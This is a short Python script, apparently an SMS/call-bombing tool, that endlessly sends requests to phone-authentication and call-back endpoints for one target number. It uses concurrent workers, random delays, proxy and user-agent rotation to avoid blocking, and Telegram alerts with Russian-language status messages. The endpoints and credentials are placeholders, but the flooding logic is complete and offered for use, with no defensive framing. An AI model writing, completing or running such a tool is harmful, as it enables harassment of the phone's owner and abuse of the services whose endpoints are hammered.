import asyncio
import aiohttp
import telebot
import random

TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
CHAT_ID = "YOUR_CHAT_ID_HERE"
TARGET_PHONE = "+79000000000"

PROXIES = []
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36"
]

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN) if TELEGRAM_BOT_TOKEN != "YOUR_BOT_TOKEN_HERE" else None

def notify_tg(text):
    if bot:
        try:
            bot.send_message(CHAT_ID, text)
        except Exception:
            pass

async def hit_endpoint(session, url, method="POST", data=None):
    proxy = random.choice(PROXIES) if PROXIES else None
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        if method == "POST":
            async with session.post(url, json=data, headers=headers, proxy=proxy, timeout=5) as resp:
                return resp.status
        else:
            async with session.get(url, headers=headers, proxy=proxy, timeout=5) as resp:
                return resp.status
    except Exception:
        return None

async def worker(phone):
    endpoints = [
        {"url": "https://example.com/api/v1/auth", "method": "POST", "data": {"phone": phone}},
        {"url": f"https://example.com/api/v1/call?phone={phone}", "method": "GET", "data": None}
    ]
    async with aiohttp.ClientSession() as session:
        while True:
            target_ep = random.choice(endpoints)
            status = await hit_endpoint(session, target_ep["url"], target_ep["method"], target_ep["data"])
            if status:
                notify_tg(f"[+] Цель: {phone} | Статус: {status}")
            await asyncio.sleep(random.uniform(0.5, 2.0))

async def main():
    notify_tg(f"[*] Запуск на номер {TARGET_PHONE}")
    tasks = [worker(TARGET_PHONE) for _ in range(5)]
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
